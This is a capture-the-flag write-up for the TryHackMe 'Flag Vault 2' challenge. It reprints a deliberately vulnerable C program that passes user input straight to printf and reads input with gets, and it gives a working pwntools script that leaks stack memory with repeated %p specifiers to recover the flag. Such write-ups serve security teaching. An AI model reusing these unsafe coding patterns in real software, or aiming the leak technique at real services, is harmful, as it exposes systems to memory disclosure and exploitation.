# [Flag Vault 2](https://tryhackme.com/room/hfb1flagvault2)

## Exploit a simple format string vulnerability.

How did you do that? No worries. I'll adjust a couple of lines of code so you won't be able to get the flag anymore. This time, for real. Here's the source code once again.

You can connect to the machine with the following command:

nc <TARGET_IP> 1337

Download the source code from [here](https://drive.google.com/file/d/1U1ILHeBBwNfG3QAjza_ho9msMd_XTniw/view?usp=sharing).

_This challenge was originally a part of the Hackfinity Battle 2025 CTF Event._

### What is the flag?

1. Analyze the source code. In `print_flag()`, the flag is read from `flag.txt` into a 200-byte local stack buffer `flag[200]` using `fgets()`. The line that would directly print it `printf("%s", flag)` is commented out, so the flag is never shown explicitly. However, the function then calls `printf(username)` where `username` is the attacker-controlled input passed in from `login()`. This is a **format string vulnerability**: passing user input directly as the format string argument to `printf()` allows an attacker to inject format specifiers such as `%p`, which tell `printf()` to walk up the call stack and print successive values as pointer-sized hexadecimal numbers. Because `flag[200]` is a local variable allocated on `print_flag()`'s own stack frame. The same frame in which the vulnerable `printf(username)` executes the flag bytes reside at a fixed offset above `printf()`'s internal argument list on the stack. Supplying enough `%p` specifiers will eventually leak the raw flag bytes. Additionally, `login()` uses the dangerous `gets()` function to read the username, which performs no bounds checking and would allow a buffer overflow, but that is not needed here.

```c
#include <stdio.h>
#include <string.h>

void print_banner(){
	printf( "  ______ _          __      __         _ _   \n"
 		" |  ____| |         \\ \\    / /        | | |  \n"
		" | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
		" |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n"
		" | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
		" |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n"
		"                  __/ |                      \n"
		"                 |___/                       \n"
		"                                             \n"
		"Version 2.1 - Fixed print_flag to not print the flag. Nothing you can do about it!\n"
		"==================================================================\n\n"
	      );
}

void print_flag(char *username){
        FILE *f = fopen("flag.txt","r");
        char flag[200];

        fgets(flag, 199, f);
        //printf("%s", flag);

	//The user needs to be mocked for thinking they could retrieve the flag
	printf("Hello, ");
	printf(username);
	printf(". Was version 2.0 too simple for you? Well I don't see no flags being shown now xD xD xD...\n\n");
	printf("Yours truly,\nByteReaper\n\n");
}

void login(){
	char username[100] = "";

	printf("Username: ");
	gets(username);

	// The flag isn't printed anymore. No need for authentication
	print_flag(username);
}

void main(){
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	// Start login process
	print_banner();
	login();

	return;
}
```

2. Craft the format string payload and parse the leaked stack. The payload `%p.` repeated 60 times is sent as the username. When `printf(username)` executes, each `%p` consumes the next value from the stack and prints it as a `0x...` hex address; the dots act as delimiters to make the output easier to parse. The server response is split on `Hello,` to isolate the format string output, then all `0x...` tokens are extracted with a regex. On a 64-bit binary, each leaked value represents up to 8 bytes of stack data stored in little-endian byte order, so each hex integer is converted to an 8-byte little-endian byte string and all chunks are concatenated. The `THM{...}` pattern is then searched in the resulting byte sequence to recover the flag.

```py
from pwn import *
import re

p = remote('<TARGET_IP>', 1337)

payload = b'%p.' * 60
p.sendline(payload)
resp = p.recvall(timeout=3).decode(errors='replace')

# Extract leaked stack values
leaks = re.findall(r'0x[0-9a-f]+', resp.split('Hello, ')[1])

# Decode each 8-byte chunk from little-endian hex
flag_bytes = b''
for v in leaks:
    flag_bytes += int(v, 16).to_bytes(8, 'little')

# Extract flag
match = re.search(rb'THM\{[^}]+\}', flag_bytes)
if match:
    print(f"[+] Flag: {match.group().decode()}")
else:
    print("[-] Flag not found. Raw bytes:")
    print(flag_bytes)
```

[SCREEN01]
